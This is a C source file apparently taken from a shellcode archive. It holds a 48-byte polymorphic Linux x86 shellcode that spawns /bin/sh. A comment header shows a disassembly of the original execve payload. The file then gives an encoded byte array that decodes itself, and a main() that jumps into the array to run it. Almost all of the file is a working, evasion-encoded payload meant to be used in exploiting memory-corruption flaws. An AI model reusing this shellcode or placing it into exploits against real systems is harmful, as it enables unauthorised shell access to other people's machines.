/*

 Title: 	Polymorphic Shellcode /bin/sh - 48 bytes
 Author: 	Jonathan Salwan
 Mail:		submit [!] shell-storm.org

 	! DataBase of shellcode : http://www.shell-storm.org/shellcode/


 Original Informations
 =====================

 Disassembly of section .text:

  08048060  <.text>:
  8048060:	 31 c0                	 xor    %eax,%eax
  8048062:	 50                   	 push   %eax
  8048063:	 68 2f 2f 73 68       	 push   $0x68732f2f
  8048068:	 68 2f 62 69 6e       	 push   $0x6e69622f
  804806d:	 89 e3                	 mov    %esp,%ebx
  804806f:	 50                   	 push   %eax
  8048070:	 53                   	 push   %ebx
  8048071:	 89 e1                	 mov    %esp,%ecx
  8048073:	 99                   	 cltd
  8048074:	 b0 0b                	 mov    $0xb,%al
  8048076:	 cd 80                	 int    $0x80


*/

#include "stdio.h"

char shellcode[] = 	"\xeb\x11\x5e\x31\xc9\xb1\x32\x80"
			"\x6c\x0e\xff\x01\x80\xe9\x01\x75"
  			"\xf6\xeb\x05\xe8\xea\xff\xff\xff"
			"\x32\xc1\x51\x69\x30\x30\x74\x69"
			"\x69\x30\x63\x6a\x6f\x8a\xe4\x51"
			"\x54\x8a\xe2\x9a\xb1\x0c\xce\x81";

int main()
{
	printf("Polymorphic Shellcode - length: %d\n",strlen(shellcode));
	(*(void(*)()) shellcode)();

	return 0;
}

// milw0rm.com [2009-08-11]